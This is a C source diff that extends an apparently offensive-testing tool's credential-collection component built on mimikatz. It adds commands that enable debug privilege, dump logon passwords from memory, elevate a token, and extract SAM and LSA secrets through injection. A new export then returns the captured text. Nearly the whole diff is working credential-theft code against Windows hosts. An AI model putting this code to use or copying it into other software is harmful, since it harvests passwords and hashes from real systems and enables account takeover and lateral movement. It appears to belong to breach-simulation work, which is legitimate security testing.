@@ -205,10 +205,40 @@ size_t WINAPI collectEntries()
 		s_list = NULL;
 	}
 
+	static wchar_t buffer[0xffff];
+	memset(buffer, 0, sizeof(buffer));
+	
+	outputBufferElements = sizeof(buffer) / sizeof(buffer[0]);
+	outputBufferElementsPosition = 0;
+	outputBuffer = buffer;
+
+	if (!outputBuffer) {
+		return 0;
+	}
+
+    //
+    // We collect some passwords to be used by the monkey.
+    // the "answer" command is used here to seperate between the output of
+    // the different commands.
+    //
+
 	s_list = List_create();
 	mimikatz_begin();
 	mimikatz_dispatchCommand(L"privilege::debug");
 	mimikatz_dispatchCommand(L"sekurlsa::logonpasswords");
+
+	mimikatz_dispatchCommand(L"token::whoami");
+	mimikatz_dispatchCommand(L"token::elevate");
+
+    // Make sure elevation was successful
+	mimikatz_dispatchCommand(L"token::whoami");
+
+	mimikatz_dispatchCommand(L"answer");
+	mimikatz_dispatchCommand(L"lsadump::sam");
+
+	mimikatz_dispatchCommand(L"answer");
+	mimikatz_dispatchCommand(L"lsadump::lsa /inject");
+	
 	mimikatz_end();
 
 	return List_getLength(s_list);
@@ -217,6 +247,14 @@ size_t WINAPI collectEntries()
 LogonData WINAPI getEntry()
 {
 	return List_pop(s_list);
+}
+
+// The "collect" entry point (collectEntries) must be called before
+// calling this function. This function returns all the textual output of the commands 
+// called in collectEntries.
+wchar_t* WINAPI getTextOutput()
+{
+	return outputBuffer;
 }
 
 FARPROC WINAPI delayHookFailureFunc (unsigned int dliNotify, PDelayLoadInfo pdli)
